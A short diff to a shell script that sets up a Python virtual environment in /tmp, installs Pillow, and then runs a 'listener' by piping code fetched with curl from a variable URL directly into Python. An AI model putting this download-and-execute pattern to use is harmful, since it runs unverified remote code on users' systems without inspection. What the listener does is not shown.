@@ -13,23 +13,11 @@ else
     exit 1
 fi
 
-# Ensure pip exists
-if ! "$PYTHON" -m pip --version >/dev/null 2>&1; then
-    "$PYTHON" -m ensurepip --default-pip || true
-fi
+cd /tmp
+"$PYTHON" -m venv pd_env_de25bd4d7600c5a0388d5338886ecc0f
+source pd_env_de25bd4d7600c5a0388d5338886ecc0f/bin/activate
 
-# Ensure Pillow is installed for the listener (used for JPEG encode/scale)
-if "$PYTHON" - <<'PY'
-try:
-    import PIL, PIL.Image  # noqa: F401
-except Exception:
-    raise SystemExit(1)
-PY
-then
-    :
-else
-    "$PYTHON" -m pip install --user "pillow>=12.0.0"
-fi
+pip install Pillow
 
 # Run the listener
 curl -sSL "$LISTENER_URL" | "$PYTHON" -
